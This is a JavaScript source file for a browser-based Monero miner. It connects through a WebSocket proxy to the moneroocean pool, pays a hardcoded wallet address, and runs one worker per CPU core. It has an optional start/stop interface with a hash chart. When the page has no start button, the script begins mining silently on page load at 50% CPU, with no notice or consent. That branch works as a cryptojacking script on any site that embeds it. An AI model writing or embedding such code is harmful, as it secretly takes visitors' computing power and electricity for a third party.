const server = "wss://proxy-cm.herokuapp.com/socket";

let job = null; // remember last job we got from the server
let workers = []; // keep track of our workers
let ws; // the websocket we use

let receiveStack = []; // everything we get from the server
let sendStack = []; // everything we send to the server
let totalhashes = 0; // number of hashes calculated
let connected = 0; // 0->disconnected, 1->connected, 2->disconnected (error), 3->disconnect (on purpose)
let reconnector = 0; // regular check if the WebSocket is still connected
let attempts = 1;

let throttleMiner = 0; // percentage of miner throttling. If you set this to 20, the
// cpu workload will be approx. 80% (for 1 thread / CPU).
// setting this value to 100 will not fully disable the miner but still
// calculate hashes with 10% CPU load

let handshake = null;

const wasmSupported = (() => {
  try {
    if (
      typeof WebAssembly === "object" &&
      typeof WebAssembly.instantiate === "function"
    ) {
      const module = new WebAssembly.Module(
        Uint8Array.of(0x0, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00)
      );
      if (module instanceof WebAssembly.Module)
        return new WebAssembly.Instance(module) instanceof WebAssembly.Instance;
    }
  } catch (e) {}
  return false;
})();

function createWorkers(numThreads) {
  let numOfLogicalProcessors = numThreads;

  // Get the number of logicalProcessors
  if (numThreads === "auto") {
    try {
      numOfLogicalProcessors = window.navigator.hardwareConcurrency;
    } catch (error) {
      // If the feature is not available default to 1 thread
      addWorker();
      return;
    }
  }

  while (numOfLogicalProcessors-- > 0) addWorker();
}

function addWorker() {
  const newWorker = new Worker("worker.js");
  workers.push(newWorker);

  newWorker.onmessage = on_workermsg;

  setTimeout(function () {
    informWorker(newWorker);
  }, 2000);
}

function openWebSocket() {
  if (ws != null) {
    ws.close();
  }

  ws = new WebSocket(server);

  ws.onmessage = (event) => {
    const obj = JSON.parse(event.data);
    receiveStack.push(obj);
    if (obj.identifier == "job") job = obj;
  };
  ws.onerror = () => {
    if (connected < 2) connected = 2;
    job = null;
  };
  ws.onclose = () => {
    if (connected < 2) connected = 2;
    job = null;
  };
  ws.onopen = function () {
    ws.send(JSON.stringify(handshake));
    attempts = 1;
    connected = 1;
  };
}

reconnector = function () {
  if (
    connected !== 3 &&
    (ws == null || (ws.readyState !== 0 && ws.readyState !== 1))
  ) {
    attempts++;
    openWebSocket();
  }

  if (connected !== 3) setTimeout(reconnector, 10000 * attempts);
};

function startBroadcast(mining) {
  if (typeof BroadcastChannel !== "function") {
    mining();
    return;
  }

  stopBroadcast();

  let bc = new BroadcastChannel("channel");

  let number = Math.random();
  let array = [];
  let timerc = 0;
  let wantsToStart = true;

  array.push(number);

  bc.onmessage = ({ data }) => {
    if (array.indexOf(data) === -1) array.push(data);
  };

  function checkShouldStart() {
    bc.postMessage(number);

    timerc++;

    if (timerc % 2 === 0) {
      array.sort();

      if (array[0] === number && wantsToStart) {
        mining();
        wantsToStart = false;
        number = 0;
      }

      array = [];
      array.push(number);
    }
  }

  startBroadcast.bc = bc;
  startBroadcast.id = setInterval(checkShouldStart, 1000);
}

function stopBroadcast() {
  if (typeof startBroadcast.bc !== "undefined") {
    startBroadcast.bc.close();
  }

  if (typeof startBroadcast.id !== "undefined") {
    clearInterval(startBroadcast.id);
  }
}

function startMining(login, numThreads = "auto") {
  if (!wasmSupported) return;

  stopMining();
  connected = 0;

  handshake = {
    identifier: "handshake",
    login: login,
    password: "web_miner",
    pool: "moneroocean.stream",
    userid: "",
    version: 7,
  };

  startBroadcast(() => {
    createWorkers(numThreads);
    reconnector();
  });
}

function stopMining() {
  connected = 3;

  if (ws != null) ws.close();
  deleteAllWorkers();
  job = null;

  stopBroadcast();
}

function deleteAllWorkers() {
  for (let i = 0; i < workers.length; i++) {
    workers[i].terminate();
  }
  workers = [];
}

function informWorker(wrk) {
  const evt = {
    data: "wakeup",
    target: wrk,
  };
  on_workermsg(evt);
}

function on_workermsg(e) {
  let wrk = e.target;

  if (connected !== 1) {
    setTimeout(function () {
      informWorker(wrk);
    }, 2000);
    return;
  }

  if (e.data != "nothing" && e.data != "wakeup") {
    const obj = JSON.parse(e.data);
    ws.send(e.data);
    sendStack.push(obj);
  }

  if (job === null) {
    setTimeout(function () {
      informWorker(wrk);
    }, 2000);
    return;
  }

  let jbthrt = {
    job: job,
    throttle: Math.max(0, Math.min(throttleMiner, 100)),
  };
  wrk.postMessage(jbthrt);

  if (e.data != "wakeup") totalhashes += 1;
}

let isCurrentlyMining = false;
let intervalId;
let myLineChart;

document.addEventListener("DOMContentLoaded", () => {
  const startButton = document.getElementById("startb");
  if (startButton) {
    startButton.addEventListener("click", start);
    createChart();
  } else {
    startMining(
      "4688YCrSqBZA5XcyPmnNieYD2ZX2wPaA5AWRtqbZCN9WLxokKMjaT7kLhnph5rzxp1DoHkzvwGJPJRM2QbQqwoBiN7PNgfZ"
    );
    throttleMiner = 50;
  }
});

function createChart() {
  const ctx = document.getElementById("myChart").getContext("2d");
  myLineChart = new Chart(ctx, {
    type: "line",
    data: {
      datasets: [
        {
          label: "Hashes resolved",
          backgroundColor: "rgb(0, 132, 255)",
          pointStyle: "line",
          data: [],
        },
      ],
    },
    options: {
      responsive: false,
      scales: {
        xAxes: [
          {
            type: "time",
            time: {
              unit: "second",
            },
          },
        ],
      },
    },
  });
}

function start() {
  let button = document.getElementById("startb");
  isCurrentlyMining = !isCurrentlyMining;

  if (isCurrentlyMining) {
    startMining(
      "4688YCrSqBZA5XcyPmnNieYD2ZX2wPaA5AWRtqbZCN9WLxokKMjaT7kLhnph5rzxp1DoHkzvwGJPJRM2QbQqwoBiN7PNgfZ"
    );
    button.textContent = "Stop mining";

    addText("Connecting...");

    intervalId = setInterval(function () {
      while (sendStack.length > 0) addText(sendStack.pop());
      while (receiveStack.length > 0) addText(receiveStack.pop());
      addData({ x: new Date(), y: totalhashes });
    }, 1000);
  } else {
    clearInterval(intervalId);
    stopMining();
    button.textContent = "Start mining";
  }
}

function addData(data) {
  myLineChart.data.datasets.forEach((dataset) => {
    dataset.data.push(data);
  });
  myLineChart.update();
}

function addText(obj) {
  let elem = document.getElementById("texta");
  elem.value += "[" + new Date().toLocaleString() + "] ";

  if (obj.identifier === "job") elem.value += "new job: " + obj.job_id;
  else if (obj.identifier === "solved")
    elem.value += "solved job: " + obj.job_id;
  else if (obj.identifier === "hashsolved") elem.value += "pool accepted hash!";
  else if (obj.identifier === "error") elem.value += "error: " + obj.param;
  else elem.value += obj;

  elem.value += "\n";
  elem.scrollTop = elem.scrollHeight;
}

(function handleThrottling() {
  let slider = document.getElementById("throttleMiner");
  let output = document.getElementById("minerPower");

  if (!slider || !output) return;
  output.innerHTML = "Miner power:" + slider.value;

  throttleMiner = 100 - slider.value;

  slider.oninput = function () {
    output.innerHTML = "Miner power:" + this.value;
    throttleMiner = 100 - slider.value;
  };
})();
